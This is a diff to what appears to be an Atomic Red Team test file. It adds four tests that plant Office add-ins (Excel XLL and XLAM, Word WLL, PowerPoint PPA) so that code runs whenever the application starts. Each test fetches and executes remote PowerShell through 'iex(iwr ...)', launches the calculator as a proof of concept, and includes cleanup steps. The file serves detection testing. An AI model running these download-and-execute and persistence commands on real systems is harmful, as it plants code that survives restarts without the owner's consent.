@@ -23,3 +23,66 @@ atomic_tests:
     elevation_required: true 
     command: |
       powershell -c "iwr -URI '#{xll_url}' -o '#{local_file}'; IEX ((new-object -ComObject excel.application).RegisterXLL('$env:tmp\HelloWorldXll.xll'))"
+- name: Persistent Code Execution Via Excel Add-in File (XLL)
+  description: |
+    Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started
+    The sample XLL provided launches the calculator as a proof-of-concept for persistent execution from Office.
+    Author of persistence code [3gstudent](https://github.com/3gstudent/Office-Persistence)
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    command: |
+      iex(iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1137.006/src/OfficePersistence.ps1"); ExcelXLL
+      Start-Process "Excel"
+    cleanup_command: |
+      $ver = (New-Object -COMObject "Excel.Application").version
+      Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore
+      Stop-Process -Name "Calculator","Excel" -ErrorAction Ignore
+- name: Persistent Code Execution Via Word Add-in File (WLL)
+  description: |
+    Creates a Word Add-in file (WLL) which runs automatically when Word is started
+    The sample WLL provided launches the calculator as a proof-of-concept for persistent execution from Office.
+    Author of persistence code [3gstudent](https://github.com/3gstudent/Office-Persistence)
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    command: |
+      iex(iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1137.006/src/OfficePersistence.ps1"); WordWLL
+      Start-Process "WinWord"
+    cleanup_command: |
+      Remove-Item "$env:APPDATA\Microsoft\Word\Startup\calc.wll" -ErrorAction Ignore
+      Stop-Process -Name "Calculator","WinWord" -ErrorAction Ignore
+- name: Persistent Code Execution Via Excel VBA Add-in File (XLAM)
+  description: |
+    Creates an Excel VBA Add-in file (XLAM) and which runs automatically when Excel is started
+    The sample XLAM provided launches the calculator as a proof-of-concept for persistent execution from Office.
+    Author of persistence code [3gstudent](https://github.com/3gstudent/Office-Persistence)
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    command: |
+      iex(iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1137.006/src/OfficePersistence.ps1"); ExcelVBAadd-ins
+      Start-Process "Excel"
+    cleanup_command: |
+      Remove-Item "$env:APPDATA\Microsoft\Excel\XLSTART\calc.xlam" -ErrorAction Ignore
+      Stop-Process -Name "Calculator","Excel" -ErrorAction Ignore
+- name: Persistent Code Execution Via PowerPoint VBA Add-in File (PPA)
+  description: |
+    Creates a PowerPoint VBA Add-in file (XLAM) and which runs automatically when PowerPoint is started
+    The sample PPA provided launches the calculator as a proof-of-concept for persistent execution from Office.
+    Author of persistence code [3gstudent](https://github.com/3gstudent/Office-Persistence)
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    command: |
+      iex(iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1137.006/src/OfficePersistence.ps1"); PowerPointVBAadd-ins
+      Start-Process "PowerPnt"
+    cleanup_command: |
+      Remove-Item "$env:APPDATA\Microsoft\AddIns\calc.ppa" -ErrorAction Ignore
+      $ver = (New-Object -COMObject "PowerPoint.Application").version
+      Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\calc" -ErrorAction Ignore
+      Stop-Process -Name "Calculator","PowerPnt" -ErrorAction Ignore
